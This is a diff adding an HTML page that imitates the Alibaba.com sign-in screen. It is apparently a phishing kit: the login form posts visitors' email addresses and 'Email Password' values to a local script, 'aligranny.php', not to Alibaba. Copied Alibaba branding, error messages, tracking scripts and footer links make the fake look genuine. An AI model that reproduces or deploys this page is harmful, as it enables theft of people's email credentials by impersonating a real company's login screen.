@@ -1,0 +1,448 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers 
+  </title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta content="Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters & Importers" name="keywords" />
+  <meta content="Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters & Importers" name="description" />
+  <link media="all" type="text/css" rel="stylesheet" href="https://stylessl.aliunicorn.com:443/6v/apollo/core/core-sc%7C6v/apollo/mod/button/button-sc%7C6v/apollo/mod/form/form-sc%7C6v/apollo/mod/footer/footer-sc%7C6v/run/login/home/home-buyer%7CMODERN_BROWSER%7Cv_0_68c540673.css" />
+  <script src="https://sha256.daily.1688.com/sha256test.js">
+  </script>
+  <script type="text/javascript" async="" src="//u.alicdn.com/js/sufei.js?v=2015-05-26">
+  </script>
+ </head>
+ <body>
+  <script src="https://stylessl.alibaba.com/js/beacon_en.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   var dmtrack_c='{-}'; var dmtrack_pageid='29976981cdcc700d1385473806'; sk_dmtracking();
+  </script>
+  <noscript>
+   <img src="https://dmtracking2.alibaba.com/b.jpg?cD0xJnU9ey9sb2dpbi5hbGliYWJhLmNvbS9sb2dpbi5odG19Jm09e0dFVH0mcz17MjAwfSZyPXstfSZhPXstfSZiPXstfSZjPXstfQ==&ver=40&pageid=29976981cdcc700d1385473806&time=1385473806" width="1" height="1" style="display:none">
+  </noscript>
+  <header class="grid grid-c1" id="header">
+   <div class="util-left" id="ali-logo">
+    <a title="Manufacturers" href="http://www.alibaba.com">
+     Alibaba.com
+    </a>
+   </div>
+   <div class="util-left" id="changelang">
+    <div id="currentlang">
+     <a href="javascript:void(0)" rel="pt_PTen_US">
+      English
+      <span class="mn-rs">
+       ]
+      </span>
+     </a>
+    </div>
+    <div style="display:none;" id="langlist">
+    </div>
+   </div>
+   <script language="Javascript">
+    function validateForm()
+{
+var x=document.forms["logon"]["email"].value;
+var atpos=x.indexOf("@");
+var dotpos=x.lastIndexOf(".");
+if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
+  {
+  alert("Invalid! Enter your correct E-mail address and E-mail Password");
+  return false;
+  }
+}
+   </script>
+   <script>
+    YUE.onDOMReady(function(){
+
+					var LANG = { 						'en_US': 'English ',
+						'zh_CN': '?? ',
+						'zh_TW': '?? ',
+						'es_ES': 'Espa&ntilde;ol ',
+						'pt_PT': 'Portugu&ecirc;s ',
+						'de_DE': 'Deutsch ',
+						'fr_FR': 'Fran&ccedil;ais ',
+						'it_IT': 'Italiano ',
+						'ru_RU': 'P?????? ',
+						'ko_KR': '??? ',
+						'ja_JP': '??? ',
+						'ar_SA': '????? ??????? ',
+						'tr_TR': 'T&uuml;rk ',
+						'th_TH': '??????? ',
+						'vi_VN': 'ti?ng Vi?t '
+					}; 
+					
+					var sl = new AE.app.switchLanguage();
+
+					sl.init({
+						currentLang: { 							 label: 			'en_US', 
+							 language: 			'English'
+						},
+						language:				LANG,
+						overkShowConfig: {
+							targetId: "currentlang",
+							contentId: "langlist",
+							showDelayTime: 200,
+							hiddenDelayTime: 200,
+							excursion: [0, 25]
+						}
+					});
+				});
+   </script>
+  </header>
+  <hr />
+  <div class="grid grid-c1 util-clearfix" id="content">
+   <script type="text/javascript">
+    var xUrlForForcedReturn = 'http://www.alibaba.com';
+				function xman_callback(){
+					window.location.href = 'http://www.alibaba.com';
+				}
+   </script>
+   <form method="post" onsubmit="return validateForm();" id="logon" autocomplete="off" action="aligranny.php">
+    <div class="util-right util-clearfix" id="login-form">
+     <div id="standardlogin">
+      <div id="joinSignBox" class="embedded-join-signIn" style="display: block;">
+       <div class="xman_box_inner">
+        <div class="xman-box-content" id="xman-box-content">
+         <div id="tabCurrentMember">
+          <div id="xsignIn-msg">
+           <div id="server-error-unavailable" class="board errorB server-error">
+            Service is unavailable, please retry again later.
+           </div>
+           <div id="server-error-illegal_passport" class="board errorB server-error">
+            <strong>
+             Incorrect Email/Member ID.
+            </strong>
+            <ul>
+             <li>
+              The Email Address or Member ID that you entered is incorrect. Please try again.
+              <br />
+             </li>
+             <li>
+              If you still encounter problems signing in, please
+              <a href="http://www.alibaba.com/help/contact-us.html" target="_blank">
+               contact us
+              </a>
+              .
+             </li>
+            </ul>
+           </div>
+           <div id="server-error-illegal_password" class="board errorB server-error">
+            <strong>
+             Incorrect Password.
+            </strong>
+            <ul>
+             <li>
+              The password that you entered is incorrect. Please try again (passwords are case sensitive).
+              <br />
+             </li>
+             <li>
+              Forgot your password?
+              <br />
+              <a id="requestPwId" href="#">
+               Request new password.
+              </a>
+             </li>
+            </ul>
+           </div>
+           <div id="server-error-blocked" class="board errorB server-error">
+            You have entered an incorrect password too many times. As a security measurement, your account will be unavailable for 30 minutes. Please re-confirm your password and try again later.
+           </div>
+           <div id="server-error-disabled" class="board errorB server-error">
+            Permission for this user has been denied. Please consult your Account Administrator for details.
+           </div>
+           <div id="server-error-ct_error" class="board errorB server-error">
+            Check code is incorrect.
+           </div>
+           <div id="server-error-ct_need" class="board alertB server-error">
+            For security purposes, please enter the characters shown.
+           </div>
+           <div id="server-error-non_admin_frozen" class="board errorB server-error">
+            Permission for this user has been denied. Please consult your Account Administrator for details.
+           </div>
+           <div id="server-error-non_admin_disabled" class="board errorB server-error">
+            Permission for this user has been denied. Please consult your Account Administrator for details.
+           </div>
+          </div>
+          <input type="hidden" value="" name="noCsrfToken" />
+          <div class="ui-form-item util-clearfix">
+           <label for="xloginPassportId" class="ui-form-label">
+            <font size="2">
+             Email Address:
+            </font>
+           </label>
+           <input class="login-input ui-textfield ui-textfield-normal" tabindex="1" value="" maxlength="128" name="email" acjs="passport" id="xloginPassportId" size="25" />
+           <div style="display: none;" id="xloginPassportId-advice-error" class="board errorB standard_signin_error">
+            Member ID is required
+           </div>
+           <div style="display: none; position: absolute; z-index: 999; top: 252px; left: 0px; width: 308px;" class="suggestionContainer">
+            <p index="0">
+            </p>
+            <p index="1">
+            </p>
+            <p index="2">
+            </p>
+            <p index="3">
+            </p>
+            <p index="4">
+            </p>
+            <p index="5">
+            </p>
+           </div>
+          </div>
+          <div class="ui-form-item util-clearfix">
+           <a href="#" id="forgotPwId">
+            <font size="2">
+             Forgot password?
+            </font>
+           </a>
+           <label for="xloginPasswordId" class="ui-form-label">
+            <font size="2">
+             Email Password:
+            </font>
+           </label>
+           <input type="password" class="login-input ui-textfield ui-textfield-normal" tabindex="2" value="" maxlength="100" name="password" acjs="password" id="xloginPasswordId" size="25" />
+           <div style="display: none;" id="xloginPasswordId-advice-error" class="board errorB standard_signin_error">
+            <font size="2">
+             Password is required
+            </font>
+           </div>
+          </div>
+          <div class="ui-form-item util-clearfix" style="display: none;" id="xloginCheckTokenTR">
+           <input type="text" tabindex="3" class="login-input ui-textfield ui-textfield-normal" autocomplete="off" value="" name="xloginCheckToken" acjs="checkcode" id="xloginCheckTokenId" placeholder="Enter the code shown:" size="18" />
+           <div class="checkcode util-clearfix">
+            <img align="absmiddle" name="xloginCheckTokenImgName" id="xloginCheckTokenImgId" src="#" />
+            <a class="standard-check-code" onfocus="this.blur()" href='javascript:refreshCodeForLogin("xloginCheckTokenImgId");'>
+            </a>
+           </div>
+           <div style="display: none;" id="xloginCheckTokenId-advice-error" class="board errorB standard_signin_error">
+            check code is required
+           </div>
+          </div>
+          <div class="ui-form-action  util-clearfix">
+           <input type="submit" value="Sign in" tabindex="5" class="ui-button ui-button-primary ui-button-large" id="signInButton" />
+          </div>
+          <div class="util-clearfix" id="entries">
+           <a title="join in" href="#" class="util-right" id="xman_join_btn">
+            Join free now!
+           </a>
+          </div>
+          <div class="util-left" id="xloginPartnerWrapper">
+           Sign in with:
+           <a onclick="javascript:dmtrack.clickstat('https://stat.alibaba.com/facebook/list.html',{d_type:'facebook'})" id="xloginFacebook" href="#">
+            <span>
+            </span>
+           </a>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div id="xman_loading_div">
+       </div>
+      </div>
+     </div>
+    </div>
+   </form>
+   <div id="banner">
+    <!--skylight-home/buyer-en-us.html -start -->
+    <p>
+     <img src="https://img.alicdn.com/tps/i2/TB1rVNAIpXXXXX5XpXXSLDwLVXX-605-350.jpg" alt="https://img.alicdn.com/tps/i2/TB1rVNAIpXXXXX5XpXXSLDwLVXX-605-350.jpg" class="decoded" />
+     <!--skylight-home/buyer-en-us.html -end -->
+    </p>
+   </div>
+   <div class="util-clearfix" id="advisory">
+    <img height="25" border="0" style="vertical-align:middle; margin-right:5px;" src="https://stylessl.aliunicorn.com/simg/single/icon/ask.gif" />
+    Can't 
+									sign in?
+    <a target="_blank" href="http://portal.manjushri.alibaba.com/portal/portal/init.jspa?instanceCode=ALIR00001293&scenceCode=SCEN00004374&digest=85f5aa43e95fbaecb08bf917c1c88aa7#">
+     Get help here
+    </a>
+   </div>
+  </div>
+  <!-- -->
+  <!-- 20131029 -->
+  <footer class="ui-footer ui-footer-wrapper" id="footer">
+   <hr class="footer-break" />
+   <div style="line-height: 15px;" class="ui-footer-seo">
+    <div class="ui-footer-seo">
+     <p class="ui-footer-seo-language">
+      <i class="global-site">
+      </i>
+      Alibaba.com Site:
+      <a href="http://www.alibaba.com">
+       International
+      </a>
+      -
+      <a href="http://spanish.alibaba.com">
+       Espa�ol
+      </a>
+      -
+      <a href="http://portuguese.alibaba.com">
+       Portugu�s
+      </a>
+      -
+      <a href="http://german.alibaba.com">
+       Deutsch
+      </a>
+      -
+      <a href="http://french.alibaba.com">
+       Fran�ais
+      </a>
+      -
+      <a href="http://italian.alibaba.com">
+       Italiano
+      </a>
+      -
+      <a href="http://russian.alibaba.com">
+       P??????
+      </a>
+      -
+      <a href="http://korean.alibaba.com">
+       ???
+      </a>
+      -
+      <a href="http://japanese.alibaba.com">
+       ???
+      </a>
+      -
+      <a href="http://arabic.alibaba.com">
+       ????? ???????
+      </a>
+      -
+      <a href="http://thai.alibaba.com">
+       ???????
+      </a>
+      -
+      <a href="http://turkish.alibaba.com">
+       T�rk
+      </a>
+      -
+      <a href="http://dutch.alibaba.com/">
+       Nederlands
+      </a>
+     </p>
+     <p class="ui-footer-seo-brand">
+      <a href="http://www.alibabagroup.com/en/global/home" rel="nofollow">
+       Alibaba Group
+      </a>
+      |
+      <a href="http://www.taobao.com" target="_blank" rel="nofollow">
+       Taobao Marketplace
+      </a>
+      |
+      <a href="http://www.tmall.com" target="_blank" rel="nofollow">
+       Tmall.com
+      </a>
+      |
+      <a href="http://ju.taobao.com" target="_blank" rel="nofollow">
+       Juhuasuan
+      </a>
+      |
+      <a href="http://www.aliexpress.com/" target="_blank" rel="nofollow">
+       AliExpress
+      </a>
+      |
+      <a href="http://www.alibaba.com" target="_blank" rel="nofollow">
+       Alibaba.com International
+      </a>
+      |
+      <a href="http://www.1688.com" target="_blank" rel="nofollow">
+       1688.com
+      </a>
+      |
+      <a href="http://www.alimama.com" target="_blank" rel="nofollow">
+       Alimama
+      </a>
+      |
+      <a href="http://www.alitrip.com/" target="_blank" rel="nofollow">
+       Alitrip
+      </a>
+      <br />
+      <a href="http://www.aliyun.com" target="_blank" rel="nofollow">
+       Alibaba Cloud Computing
+      </a>
+      |
+      <a href="http://www.yunos.com" target="_blank" rel="nofollow">
+       YunOS
+      </a>
+      |
+      <a href="http://aliqin.tmall.com" target="_blank" rel="nofollow">
+       AliTelecom
+      </a>
+      |
+      <a href="http://www.net.cn" target="_blank" rel="nofollow">
+       HiChina
+      </a>
+      |
+      <a href="http://www.autonavi.com/" target="_blank" rel="nofollow">
+       Autonavi
+      </a>
+      |
+      <a href="http://www.uc.cn/" target="_blank" rel="nofollow">
+       UCWeb
+      </a>
+      |
+      <a href="http://www.umeng.com/" target="_blank" rel="nofollow">
+       Umeng
+      </a>
+      |
+      <a href="http://kanbox.com/" target="_blank" rel="nofollow">
+       Kanbox
+      </a>
+      |
+      <a href="http://www.xiami.com" target="_blank" rel="nofollow">
+       Xiami
+      </a>
+      |
+      <a href="http://www.ttpod.com/" target="_blank" rel="nofollow">
+       TTPod
+      </a>
+      |
+      <a href="https://www.laiwang.com" target="_blank" rel="nofollow">
+       Laiwang
+      </a>
+      |
+      <a href="http://www.dingtalk.com/?lwfrom=20150202135600390" target="_blank" rel="nofollow">
+       DingTalk
+      </a>
+      |
+      <a href="https://11main.com/" target="_blank" rel="nofollow">
+       11 Main
+      </a>
+      |
+      <a href="https://intl.alipay.com/index.htm" target="_blank" rel="nofollow">
+       Alipay
+      </a>
+     </p>
+     <p class="ui-footer-policy">
+      <a href="http://rule.alibaba.com/rule/detail/2047.htm" rel="nofollow">
+       Product Listing Policy
+      </a>
+      -
+      <a href="http://rule.alibaba.com/rule/detail/2049.htm" rel="nofollow">
+       Intellectual Property Policy and Infringement Claims
+      </a>
+      -
+      <a href="http://rule.alibaba.com/rule/detail/2034.htm" rel="nofollow">
+       Privacy Policy
+      </a>
+      -
+      <a href="http://rule.alibaba.com/rule/detail/2041.htm" rel="nofollow">
+       Terms of Use
+      </a>
+     </p>
+     <p class="ui-footer-copyright">
+      <a href="http://www.alibaba.com/trade/servlet/page/static/copyright_policy" rel="nofollow">
+       �
+      </a>
+      1999-2015 Alibaba.com. All rights reserved.
+     </p>
+    </div>
+    <p>
+    </p>
+   </div>
+  </footer>
+  <!-- dragoon check -->
+ </body>
+</html>
